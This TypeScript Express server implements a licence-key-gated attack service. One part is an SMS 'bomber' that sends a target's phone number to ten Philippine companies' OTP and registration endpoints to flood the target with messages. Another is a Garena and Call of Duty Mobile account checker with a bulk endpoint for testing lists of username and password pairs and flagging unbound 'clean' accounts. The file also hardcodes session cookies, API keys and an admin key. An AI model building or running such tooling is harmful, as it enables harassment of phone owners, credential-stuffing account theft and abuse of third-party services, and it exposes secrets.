import express from "express";
import { createServer as createViteServer } from "vite";
import path from "path";
import axios from "axios";
import { fileURLToPath } from "url";
import helmet from "helmet";
import rateLimit from "express-rate-limit";
import crypto from "crypto";
import { wrapper } from 'axios-cookiejar-support';
import { CookieJar } from 'tough-cookie';
import fs from "fs";

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const KEYS_FILE = path.join(process.cwd(), "keys.txt");

// Initialize keys.txt if it doesn't exist
if (!fs.existsSync(KEYS_FILE)) {
  fs.writeFileSync(KEYS_FILE, "DEVADMINKEY@021412 | 2099-12-31\nFREE-KEY-TOSHI | 2026-12-31\n");
}

// --- Garena Logic ---
const GARENA_API = "https://sso.garena.com/api/v1";
const CODM_APP_ID = 100082;

// Provided cookies
const PRESET_COOKIES = [
  "datadome=CJhwf2dsyEBHuxYkwd8pFRxBw7hFCEDN6x3O0jmLHvQAjdDsizkk4BtOA~_mIWJAamcH4MqkR~gzG9jOZmZDevnHwHPg6iea3jjjC4YRokEHYYb8Az~HbbTUEZ1UutzI; sso_key=7c6040e9fb20450045a019bb48d2b12e2258525a22546bc879be1d72fad26054; token_session=ff8025e38986dce61cd8559cb12576edd5237f62336a30721057db7e4c83b96483f7c0bddc373552d472a477f27a90df; ac_session=pdhi1s7v9pelqo6o8e67ua9qq7162wem; session_key=wb2g5bo4wacu2qil4tg76t9w2p2cp3ex",
  "datadome=ruF_N5RsMx8cFmbsQIbBeLK9ZRUyQLM1Q2ET1Q6VHKYM0BzcXbLroeMQtiEH56VaddFh7PWm4ehToTIwhTd7hNyKUcmLPV~mhPaekdBbx28dJ8eij3NnsSs4megkJtQj; sso_key=bf4c34fa9a02bf3adcdeb74de564d487156b070847cfe305c9e4b191b9253a0b; token_session=013d66b52ec3fee757e9d8cfdb6fe3da8870f7bd5b93ebb0081916efd69bc3059a48cf1eb11de92485b477b951b58d9c; ac_session=3ygrqo1wug7l7qhrfqcjuurzgzyeq1xs; session_key=ksrr0slatvv9g41nn2ee5jn3buq6eztmwr0wymCw5eRLY3QWs2uiQmuOROsA~FIHqTPRfcfAqjHH6LA2Ww2df0d3b3l4~DW7Xx8pcCIuY8N~zrXZSWzNTE0SRHnY6NARmeoE9QdhJbjIstSP~FnBGIvyKm2pyrt1"
];

function getPassMd5(password: string): string {
  return crypto.createHash("md5").update(password).digest("hex");
}

function hashPassword(password: string, vcode: string): string {
  const md5Pass = getPassMd5(password);
  return crypto.createHash("md5").update(md5Pass + vcode.toLowerCase()).digest("hex");
}

// --- Services ---
// (Moved inside startServer for better scoping)

async function startServer() {
  const app = express();

  // Trust the proxy (Cloud Run / Nginx) to correctly identify client IPs
  app.set('trust proxy', 1);

  app.use(helmet({
    contentSecurityPolicy: false,
  }));
  app.use(express.json());

  // Rate limiting
  const limiter = rateLimit({
    windowMs: 15 * 60 * 1000,
    max: 2000, // Increased from 100 to 2000 to accommodate "bomber" functionality
    // Use the IP address from the trusted proxy
    keyGenerator: (req) => {
      return req.ip || req.headers['x-forwarded-for']?.toString() || req.socket.remoteAddress || 'unknown';
    },
    validate: { xForwardedForHeader: false, forwardedHeader: false }
  });
  app.use("/api/", limiter);

  // Real service handlers from the provided Python script
  const randomString = (length: number) => {
    const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
    let result = '';
    for (let i = 0; i < length; i++) {
      result += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return result;
  };

  const services = [
    {
      name: "S5.com",
      handler: async (num: string) => {
        try {
          const formatted = num.startsWith("0") ? "+63" + num.slice(1) : "+63" + num;
          const boundary = "----WebKitFormBoundary" + randomString(16);
          const data = `--${boundary}\r\nContent-Disposition: form-data; name="phone_number"\r\n\r\n${formatted}\r\n--${boundary}--\r\n`;
          const res = await axios.post("https://api.s5.com/player/api/v1/otp/request", data, {
            headers: {
              'authority': 'api.s5.com',
              'accept': 'application/json, text/plain, */*',
              'accept-language': 'en',
              'access-control-allow-origin': '*',
              'cache-control': 'no-cache',
              'content-type': `multipart/form-data; boundary=${boundary}`,
              'origin': 'https://www.s5.com',
              'pragma': 'no-cache',
              'referer': 'https://www.s5.com/',
              'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
              'sec-ch-ua-mobile': '?1',
              'sec-ch-ua-platform': '"Android"',
              'sec-fetch-dest': 'empty',
              'sec-fetch-mode': 'cors',
              'sec-fetch-site': 'same-site',
              'user-agent': 'Mozilla/5.0 (Linux; Android 11; RMX2195) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
              'x-api-type': 'external',
              'x-locale': 'en',
              'x-public-api-key': 'd6a6d988-e73e-4402-8e52-6df554cbfb35',
              'x-timezone-offset': '480'
            },
            timeout: 10000,
          });
          return res.status;
        } catch (error: any) {
          return error.response?.status || 500;
        }
      },
    },
    {
      name: "Xpress PH",
      handler: async (num: string) => {
        try {
          const formatted = num.startsWith("0") ? "+63" + num.slice(1) : "+63" + num;
          const res = await axios.post("https://api.xpress.ph/v1/api/XpressUser/CreateUser/SendOtp", {
            "FirstName": "toshi",
            "LastName": "premium",
            "Email": `toshi${Date.now()}@gmail.com`,
            "Phone": formatted,
            "Password": "ToshiPass123",
            "ConfirmPassword": "ToshiPass123",
            "ImageUrl": "",
            "RoleIds": [4],
            "Area": "manila",
            "City": "manila",
            "PostalCode": "1000",
            "Street": "toshi_street",
            "ReferralCode": "",
            "FingerprintVisitorId": "TPt0yCuOFim3N3rzvrL1",
            "FingerprintRequestId": "1757149666261.Rr1VvG",
          }, {
            headers: {
              "User-Agent": "Dalvik/35 (Linux; U; Android 15; 2207117BPG Build/AP3A.240905.015.A2)/Dart",
              "Accept": "application/json",
              "Accept-Encoding": "gzip",
              "Content-Type": "application/json",
              "conversationid": "42d64cfe-330f-4876-aed2-5a3b1547e2ce",
              "Cookie": "ApplicationGatewayAffinityCORS=9af1ffd531ed95805ec09cbdf3793dd6; ApplicationGatewayAffinity=9af1ffd531ed95805ec09cbdf3793dd6",
            },
            timeout: 10000
          });
          return res.status;
        } catch (error: any) {
          return error.response?.status || 500;
        }
      },
    },
    {
      name: "Abenson",
      handler: async (num: string) => {
        try {
          const res = await axios.post('https://api.mobile.abenson.com/api/public/membership/activate_otp', 
            `contact_no=${num}&login_token=undefined`, 
            {
              headers: {
                'User-Agent': 'Mozilla/5.0 (Linux; Android 15)',
                'Accept': 'application/json',
                'Content-Type': 'application/x-www-form-urlencoded',
                'x-requested-with': 'com.abensonmembership.cloone',
                'origin': 'https://localhost',
                'referer': 'https://localhost/'
              },
              timeout: 10000
            }
          );
          return res.status;
        } catch (error: any) {
          return error.response?.status || 500;
        }
      },
    },
    {
      name: "Excellente Lending",
      handler: async (num: string) => {
        try {
          const coordinates = [
            { lat: '14.5995', long: '120.9842' },
            { lat: '14.6760', long: '121.0437' },
            { lat: '14.8648', long: '121.0418' }
          ];
          const coord = coordinates[Math.floor(Math.random() * coordinates.length)];
          const res = await axios.post('https://api.excellenteralending.com/dllin/union/rehabilitation/dock', {
            "domain": num,
            "cat": "login",
            "previous": false,
            "financial": "efe35521e51f924efcad5d61d61072a9"
          }, {
            headers: {
              'User-Agent': 'okhttp/4.12.0',
              'Connection': 'Keep-Alive',
              'Accept-Encoding': 'gzip',
              'Content-Type': 'application/json; charset=utf-8',
              'x-version': '1.1.2',
              'x-package-name': 'com.support.excellenteralending',
              'x-adid': 'efe35521e51f924efcad5d61d61072a9',
              'x-latitude': coord.lat,
              'x-longitude': coord.long
            },
            timeout: 10000
          });
          return res.status;
        } catch (error: any) {
          return error.response?.status || 500;
        }
      },
    },
    {
      name: "FortunePay",
      handler: async (num: string) => {
        try {
          const cleanNum = num.startsWith("0") ? num.slice(1) : num;
          const res = await axios.post('https://api.fortunepay.com.ph/customer/v2/api/public/service/customer/register', {
            "deviceId": 'c31a9bc0-652d-11f0-88cf-9d4076456969',
            "deviceType": 'GOOGLE_PLAY',
            "companyId": '4bf735e97269421a80b82359e7dc2288',
            "dialCode": '+63',
            "phoneNumber": cleanNum
          }, {
            headers: {
              'User-Agent': 'Dart/3.6 (dart:io)',
              'Accept-Encoding': 'gzip',
              'Content-Type': 'application/json',
              'app-type': 'GOOGLE_PLAY',
              'authorization': 'Bearer',
              'app-version': '4.3.5',
              'signature': 'edwYEFomiu5NWxkILnWePMektwl9umtzC+HIcE1S0oY=',
              'timestamp': Date.now().toString(),
              'nonce': `${randomString(10)}-${Date.now()}`
            },
            timeout: 10000
          });
          return res.status;
        } catch (error: any) {
          return error.response?.status || 500;
        }
      },
    },
    {
      name: "WeMove",
      handler: async (num: string) => {
        try {
          const cleanNum = num.startsWith("0") ? num.slice(1) : num;
          const res = await axios.post('https://api.wemove.com.ph/auth/users', {
            "phone_country": '+63',
            "phone_no": cleanNum
          }, {
            headers: {
              'User-Agent': 'okhttp/4.9.3',
              'Accept': 'application/json, text/plain, */*',
              'Accept-Encoding': 'gzip',
              'Content-Type': 'application/json',
              'xuid_type': 'user',
              'source': 'customer',
              'authorization': 'Bearer'
            },
            timeout: 10000
          });
          return res.status;
        } catch (error: any) {
          return error.response?.status || 500;
        }
      },
    },
    {
      name: "LBC",
      handler: async (num: string) => {
        try {
          const cleanNum = num.startsWith("0") ? num.slice(1) : num;
          const res = await axios.post('https://lbcconnect.lbcapps.com/lbcconnectAPISprint2BPSGC/AClientThree/processInitRegistrationVerification', 
            `verification_type=mobile&client_email=${randomString(8)}@gmail.com&client_contact_code=%2B63&client_contact_no=${cleanNum}&app_log_uid=${randomString(16)}&app_platform=Android&device_name=rosemary_p_global&device_os=Android15&device_brand=Xiaomi&app_version=3.0.67&app_framework=lbc_app&app_environment=production&app_hash=${randomString(32)}`,
            {
              headers: {
                'User-Agent': 'Dart/2.19 (dart:io)',
                'Accept-Encoding': 'gzip',
                'Content-Type': 'application/x-www-form-urlencoded',
                'api': 'LBC',
                'token': 'CONNECT'
              },
              timeout: 10000
            }
          );
          return res.status;
        } catch (error: any) {
          return error.response?.status || 500;
        }
      },
    },
    {
      name: "Pickup Coffee",
      handler: async (num: string) => {
        try {
          const formatted = num.startsWith("0") ? "+63" + num.slice(1) : "+63" + num;
          const res = await axios.post('https://production.api.pickup-coffee.net/v2/customers/login', {
            "mobile_number": formatted,
            "login_method": 'mobile_number'
          }, {
            headers: {
              'User-Agent': 'okhttp/4.12.0',
              'Accept-Encoding': 'gzip',
              'Content-Type': 'application/json',
              'x-env': 'Production',
              'x-app-version': '2.7.0'
            },
            timeout: 10000
          });
          return res.status;
        } catch (error: any) {
          return error.response?.status || 500;
        }
      },
    },
    {
      name: "HoneyLoan",
      handler: async (num: string) => {
        try {
          const res = await axios.post('https://api.honeyloan.ph/api/client/registration/step-one', {
            "phone": num,
            "is_rights_block_accepted": 1
          }, {
            headers: {
              'User-Agent': 'Mozilla/5.0 (Linux; Android 15; 2207117BPG Build/AP3A.240905.015.A2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/139.0.7258.143 Mobile Safari/537.36',
              'Accept': 'application/json, text/plain, */*',
              'Accept-Encoding': 'gzip, deflate, br, zstd',
              'Content-Type': 'application/json',
              'origin': 'https://honeyloan.ph',
              'referer': 'https://honeyloan.ph/',
              'x-requested-with': 'com.startupcalculator.caf'
            },
            timeout: 10000
          });
          return res.status;
        } catch (error: any) {
          return error.response?.status || 500;
        }
      },
    },
    {
      name: "Komo",
      handler: async (num: string) => {
        try {
          const res = await axios.post('https://api.komo.ph/api/otp/v5/generate', {
            "mobile": num,
            "transactionType": 6
          }, {
            headers: {
              'Connection': 'close',
              'Accept-Encoding': 'gzip',
              'Content-Type': 'application/json',
              'Signature': 'ET/C2QyGZtmcDK60Jcavw2U+rhHtiO/HpUTT4clTiISFTIshiM58ODeZwiLWqUFo51Nr5rVQjNl6Vstr82a8PA==',
              'Ocp-Apim-Subscription-Key': 'cfde6d29634f44d3b81053ffc6298cba'
            },
            timeout: 10000
          });
          return res.status;
        } catch (error: any) {
          return error.response?.status || 500;
        }
      },
    }
  ];

  // Simulated service handlers with realistic delays
  const createHandler = (name: string) => async (target: string) => {
    // Simulate network latency
    await new Promise(r => setTimeout(r, 200 + Math.random() * 800));
    // Simulate random success/failure (mostly success for demo purposes)
    return Math.random() > 0.05 ? 200 : 500;
  };

  const emailServices = [
    { name: "SendGrid Engine", handler: createHandler("SendGrid") },
    { name: "Mailgun Relay", handler: createHandler("Mailgun") },
    { name: "Amazon SES", handler: createHandler("SES") },
    { name: "Postmark API", handler: createHandler("Postmark") },
    { name: "SparkPost", handler: createHandler("SparkPost") },
  ];

  // Health check (now just checks keys file)
  app.get("/api/db-health", async (req, res) => {
    try {
      if (fs.existsSync(KEYS_FILE)) {
        res.json({ status: "ok", message: "File-based system active" });
      } else {
        res.status(500).json({ status: "error", message: "Keys file missing" });
      }
    } catch (err: any) {
      res.status(500).json({ status: "error", message: err.message });
    }
  });

  // Get available services
  app.get("/api/services", (req, res) => {
    res.json(services.map(s => s.name));
  });

  app.get("/api/email-services", (req, res) => {
    res.json(emailServices.map(s => s.name));
  });

  // Key Validation API (File-based)
  app.post("/api/validate-key", (req, res) => {
    const { key } = req.body;
    if (!key) return res.status(400).json({ error: "Key is required" });

    try {
      const content = fs.readFileSync(KEYS_FILE, "utf-8");
      const lines = content.split("\n");
      for (const line of lines) {
        const [k, exp] = line.split("|").map(s => s.trim());
        if (k === key) {
          const expDate = new Date(exp);
          if (expDate > new Date()) {
            return res.json({ status: "SUCCESS", expiration: exp });
          } else {
            return res.json({ status: "EXPIRED", expiration: exp });
          }
        }
      }
      res.json({ status: "INVALID" });
    } catch (err) {
      res.status(500).json({ error: "Failed to read keys file" });
    }
  });

  // Admin: Add Key
  app.post("/api/admin/add-key", (req, res) => {
    const { key, expiration, adminKey } = req.body;
    if (adminKey !== "DEVADMINKEY@021412") return res.status(403).json({ error: "Unauthorized" });
    
    try {
      fs.appendFileSync(KEYS_FILE, `${key} | ${expiration}\n`);
      res.json({ status: "SUCCESS" });
    } catch (err) {
      res.status(500).json({ error: "Failed to write key" });
    }
  });

  // Admin: List Keys
  app.get("/api/admin/keys", (req, res) => {
    const { adminKey } = req.query;
    if (adminKey !== "DEVADMINKEY@021412") return res.status(403).json({ error: "Unauthorized" });

    try {
      const content = fs.readFileSync(KEYS_FILE, "utf-8");
      const keys = content.split("\n")
        .filter(line => line.trim())
        .map(line => {
          const [key, expiration] = line.split("|").map(s => s.trim());
          return { id: key, key, expiration };
        });
      res.json(keys);
    } catch (err) {
      res.status(500).json({ error: "Failed to read keys" });
    }
  });

  // Admin: Revoke Key
  app.post("/api/admin/revoke-key", (req, res) => {
    const { key, adminKey } = req.body;
    if (adminKey !== "DEVADMINKEY@021412") return res.status(403).json({ error: "Unauthorized" });

    try {
      const content = fs.readFileSync(KEYS_FILE, "utf-8");
      const lines = content.split("\n").filter(line => {
        const [k] = line.split("|").map(s => s.trim());
        return k !== key;
      });
      fs.writeFileSync(KEYS_FILE, lines.join("\n") + (lines.length ? "\n" : ""));
      res.json({ status: "SUCCESS" });
    } catch (err) {
      res.status(500).json({ error: "Failed to revoke key" });
    }
  });

  // Garena Checker API
  // Garena Checker Logic
  const checkGarenaAccount = async (account, password, customCookies = null) => {
    const requestJar = new CookieJar();
    const requestClient = wrapper(axios.create({ jar: requestJar }));

    // Apply custom cookies if provided, otherwise use presets
    const cookiesToUse = customCookies || PRESET_COOKIES[Math.floor(Math.random() * PRESET_COOKIES.length)];
    const cookieArray = Array.isArray(cookiesToUse) ? cookiesToUse : cookiesToUse.split('; ');
    
    cookieArray.forEach(c => {
      try {
        const cookie = c.trim();
        if (!cookie) return;
        requestJar.setCookieSync(cookie, 'https://sso.garena.com');
        requestJar.setCookieSync(cookie, 'https://account.garena.com');
        requestJar.setCookieSync(cookie, 'https://100082.connect.garena.com');
      } catch (e) {}
    });

    // 1. Prelogin
    const prelogin = await requestClient.get(`${GARENA_API}/prelogin`, {
      params: { account, format: "json" },
      timeout: 10000
    }).then(r => r.data);

    if (prelogin.error) {
      return { status: "FAILED", error: prelogin.error };
    }

    // 2. Login
    const passwordHash = hashPassword(password, prelogin.vcode);
    const loginData = await requestClient.post(`${GARENA_API}/login`, {
      account,
      password: passwordHash,
      vcode: prelogin.vcode,
      format: "json"
    }, { timeout: 10000 }).then(r => r.data);

    if (loginData.error) {
      return { status: "FAILED", error: loginData.error };
    }

    // 3. Get Full Account Details
    const accountInit = await requestClient.get('https://account.garena.com/api/account/init', {
      headers: {
        'accept': '*/*',
        'referer': 'https://account.garena.com/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36'
      },
      timeout: 10000
    }).then(r => r.data).catch(() => null);
    
    // 4. Check CODM Info
    let codmInfo = null;
    try {
      const tokenRes = await requestClient.get('https://100082.connect.garena.com/api/login/token', {
        params: {
          access_token: loginData.access_token,
          redirect_uri: 'https://codm.garena.com/',
          response_type: 'token',
          app_id: CODM_APP_ID
        },
        timeout: 10000
      });
      
      if (tokenRes.data && tokenRes.data.token) {
        const codmRes = await requestClient.get('https://codm.garena.com/api/user/info', {
          params: { token: tokenRes.data.token },
          timeout: 10000
        });
        if (codmRes.data && codmRes.data.nickname) {
          codmInfo = {
            nickname: codmRes.data.nickname,
            level: codmRes.data.level || 0,
            region: codmRes.data.region || 'Unknown',
            uid: codmRes.data.uid || 'N/A'
          };
        }
      }
    } catch (e: any) {
      console.error("[CODM Info] Error:", e.message);
    }

    const userInfo = accountInit?.user_info || {};
    
    return { 
      status: "SUCCESS", 
      data: {
        uid: loginData.uid || userInfo.uid,
        nickname: loginData.nickname || userInfo.nickname,
        account: loginData.account || userInfo.username,
        email: userInfo.email,
        email_status: userInfo.email_v ? "Verified" : "Unverified",
        mobile_status: userInfo.mobile_no ? "Bound" : "Unbound",
        shell_balance: userInfo.shell || 0,
        codm: codmInfo,
        is_clean: !userInfo.email_v && !userInfo.mobile_no && !userInfo.is_fbconnect_enabled
      }
    };
  };

  app.post("/api/garena/check", async (req, res) => {
    try {
      const { account, password, cookies } = req.body;
      if (!account || !password) {
        return res.status(400).json({ error: "Account and password are required" });
      }
      const result = await checkGarenaAccount(account, password, cookies);
      res.json(result);
    } catch (error: any) {
      res.json({ status: "FAILED", error: error.message });
    }
  });

  app.post("/api/garena/bulk-check", async (req, res) => {
    try {
      const { accounts, cookies } = req.body; // accounts is array of {user, pass}
      if (!Array.isArray(accounts)) {
        return res.status(400).json({ error: "Accounts must be an array" });
      }

      const results = [];
      // Process in small batches to avoid rate limits
      for (let i = 0; i < accounts.length; i += 3) {
        const batch = accounts.slice(i, i + 3);
        const batchResults = await Promise.all(batch.map(acc => 
          checkGarenaAccount(acc.user, acc.pass, cookies)
            .catch(err => ({ status: "FAILED", account: acc.user, error: err.message }))
        ));
        results.push(...batchResults);
        if (i + 3 < accounts.length) await new Promise(r => setTimeout(r, 1000));
      }

      res.json({ status: "SUCCESS", results });
    } catch (error: any) {
      res.json({ status: "FAILED", error: error.message });
    }
  });

  // Local API handler (matches Netlify Function logic)
  app.post("/api/api", async (req, res) => {
    try {
      const { number, serviceIndex } = req.body;
      console.log(`[API] Request for ${number} using service index ${serviceIndex}`);
      
      const idx = parseInt(serviceIndex);
      const service = services[idx];
      
      if (!service) {
        console.error(`[API] Invalid service index: ${serviceIndex}`);
        return res.status(400).json({ error: `Invalid service index: ${serviceIndex}` });
      }

      const status = await service.handler(number);
      res.json({ name: service.name, status: "SUCCESS", code: status });
    } catch (error: any) {
      console.error(`[API] Service error: ${error.message}`);
      res.json({ status: "FAILED", error: error.message });
    }
  });

  app.post("/api/email", async (req, res) => {
    try {
      const { email, serviceIndex } = req.body;
      console.log(`[Email API] Request for ${email} using service index ${serviceIndex}`);
      
      const idx = parseInt(serviceIndex);
      const service = emailServices[idx];
      
      if (!service) {
        return res.status(400).json({ error: `Invalid service index: ${serviceIndex}` });
      }

      const status = await service.handler(email);
      res.json({ name: service.name, status: "SUCCESS", code: status });
    } catch (error: any) {
      console.error(`[Email API] Service error: ${error.message}`);
      res.json({ status: "FAILED", error: error.message });
    }
  });

  if (process.env.NODE_ENV !== "production") {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: "spa",
    });
    app.use(vite.middlewares);
  } else {
    const distPath = path.join(process.cwd(), "dist");
    app.use(express.static(distPath));
    app.get("*", (req, res) => {
      res.sendFile(path.join(distPath, "index.html"));
    });
  }

  const PORT = parseInt(process.env.PORT || "3000", 10);
  app.listen(PORT, "0.0.0.0", () => {
    console.log(`Server running on port ${PORT}`);
  });
}

startServer();
